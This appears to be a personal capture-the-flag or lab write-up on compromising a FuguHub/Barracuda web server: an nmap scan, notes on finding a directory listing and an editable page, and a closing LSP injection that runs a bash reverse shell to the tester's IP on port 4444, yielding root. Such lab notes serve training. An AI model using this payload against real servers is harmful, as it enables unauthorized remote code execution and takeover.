My IP: 192.168.45.197
Target IP: 192.168.163.25

## NMAP Scan
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http       nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: 403 Forbidden
8082/tcp open  http       Barracuda Embedded Web Server
|_http-title: Home
| http-webdav-scan: 
|   Server Type: BarracudaServer.com (Posix)
|   Server Date: Wed, 29 Apr 2026 06:41:12 GMT
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|_http-server-header: BarracudaServer.com (Posix)
| http-methods: 
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
9999/tcp open  ssl/abyss?
|_ssl-date: 2026-04-29T06:41:14+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost
| Not valid before: 2019-07-16T19:15:09
|_Not valid after:  2074-04-18T19:15:09
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


Confirmed - 
Trying to access the page in the webroswer using the standard port of 80, shows a forbidden (error) page. However specifying port 8082 we can see a webpage. Port 9999 initially gives us a blank page with some special characters that we cant do anything with.

![[Pasted image 20260428234623.png]]


Here we find a version number of the website
![[Pasted image 20260428234908.png]]


![[Pasted image 20260503003048.png]]Here we found a page showing all the different directories active on this server. This is important because, if ever we were to upload a malicious file we would always know where it could go (just would have to go finding it)

![[Pasted image 20260503004851.png]]An even better path. We found a customize about page section. Here we can embed a rev shell to use it pivot. 

![[Pasted image 20260503014418.png]]Using this command `<?lsp os.execute("bash -c 'bash -i >& /dev/tcp/192.168.45.215/4444 0>&1'") ?>` I was able to get  a rev shell. And from there I was already root user. 
![[Pasted image 20260503014547.png]]